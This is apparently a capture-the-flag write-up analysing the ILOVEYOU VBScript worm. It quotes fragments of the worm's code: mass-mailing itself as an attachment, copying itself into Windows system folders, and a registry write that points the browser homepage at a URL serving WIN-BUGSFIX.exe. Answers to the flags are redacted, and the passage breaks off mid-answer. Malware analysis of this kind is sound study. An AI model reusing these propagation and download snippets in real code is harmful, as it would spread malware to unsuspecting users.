# ILOVEYOU

# Challange intro
```
Points: 
10

Category: 
Reverse Engineering

Cost: 
Free

Scenario:
ILOVEYOU the 3 magical words which have an impact in most of the people's life.
On the other hand, these 3 words don't need any introduction for the people in the Infosec industry.

Let's relive history by analysing the ‘ILOVEYOU’ malware.

This challenge should be completed in a virtual machine as it contains real malware.
```

## Q1, What is the text present as part of email when the victim received this malware?

My thought process here was to check the email body tag, where I could find the code

```
male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "<FLAG>"
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
          male.Send
```
And by looking within the "male.body" we can read the mails content.

## Q2, What is the domain name that was added as the browser's homepage?

Homepages are based on register sub-keys/values (in most cases). So i started looking for the startpages keys for diffrent browsers.

```

regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "<FLAG>"/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"

```
By using ctrl + f I got a hit on the IE StartPage path in the code. 

## Q3, The malware replicated itself into 3 locations, what are they?

For this some fast research was needed. 

In the code I found this code snippet:

```
rem Finds special folders, such as system, temporary and windows folders.
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)

  rem Copy itself into VBScript files <PART OF THE FLAG.vbs>, <PART OF THE FLAG.vbs> and
  rem <PART OF THE FLAG.TXT.VBS>
  c.Copy(dirsystem & "<PART OF THE FLAG>")
  c.Copy(dirwin & "\<PART OF THE FLAG>")
  c.Copy(dirsystem & "\<PART OF THE FLAG>")
````
To summirize in short, in VBS there is a "GetSpecialFolder" method. Where in this case the fso.GetSpecialFolder(1).
"GetSpecialFolder" becomes the object and the (number) becomes the folderspec.

```
0 = The Windows folder contains files installed by the Windows operating system. In this case 

1 = The System folder contains libraries, fonts, and device drivers. 

2 = The Temp folder is used to store temporary files. Its path is found in the TMP environment variable.

In this case: 
dirsystem --> C:\Windows\System32\
dirwin -- > C:\Windows\
```
Then we just add the the object + the file = C:\Windows\System32\<PART OF THE FLAG>

## Q4, What is the name of the file that looks for the filesystem?

My approach here was very starightforward. 

I just ctrl + f and searched for the most common windows filesystems NTFS & FAT32

And got a hit: 

```
rem Check if a file named "<FLAG>" exists in the system files.
  If (fileexist(dirsystem & "<FLAG>") = 1) Then
    Randomize
```

## Q5, Which file extensions, beginning with m, does this virus target?

At this point, I started to learn how the malware behaved. The malware liked to copy itself to to exsiting files in the system 